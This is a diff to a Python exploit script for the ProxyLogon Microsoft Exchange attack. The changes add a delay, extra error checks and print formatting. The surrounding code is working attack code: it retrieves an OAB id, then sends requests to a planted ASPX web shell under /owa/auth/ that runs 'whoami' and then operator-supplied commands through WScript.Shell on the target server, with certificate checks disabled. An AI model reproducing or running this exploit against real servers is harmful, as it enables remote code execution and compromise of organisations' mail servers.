@@ -5,6 +5,7 @@ import string
 import sys
 import base64
 import re
+import time
 from struct import unpack
 
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
@@ -238,7 +239,7 @@ def proxyLogon(sid):
     elif "RawIdentity" not in ct.text:
         print("[-] Get OAB Error!")
         exit()
-        
+
     oabId = str(ct.content).split('"RawIdentity":"')[1].split('"')[0]
     print(" |")
     print("[*]Got OAB id")
@@ -290,7 +291,9 @@ def proxyLogon(sid):
     print(" |")
     print("[+] request shell now")
     shell_url = "https://" + target + "/owa/auth/qwesdSDFASFQqeqweqsf.aspx"
+    time.sleep(10)
     # print('code=Response.Write(new ActiveXObject("WScript.Shell").exec("whoami").StdOut.ReadAll());')
+
     data = requests.post(shell_url, data={
         "code": "Response.Write(new ActiveXObject(\"WScript.Shell\").exec(\"whoami\").StdOut.ReadAll());"},
                          verify=False, proxies=proxies)
@@ -299,7 +302,7 @@ def proxyLogon(sid):
     elif "<div class=\"errorHeader\">404</div>" in data.text:
         print("[-] request shell failure , 404 shell ! ")
     else:
-        print(" |")
+        print("\n |")
         print("[*]Got shell success")
         print(" |")
         print()
@@ -320,6 +323,8 @@ def proxyLogon(sid):
                         cmd)},
                                      verify=False, proxies=proxies)
                 if data.status_code == 500:
+                    print("[-] exec error ! ")
+                elif "errorFooter" in data.text:
                     print("[-] exec error ! ")
                 else:
                     print(data.text.split("OAB (Default Web Site)")[0].replace("Name                            : ",
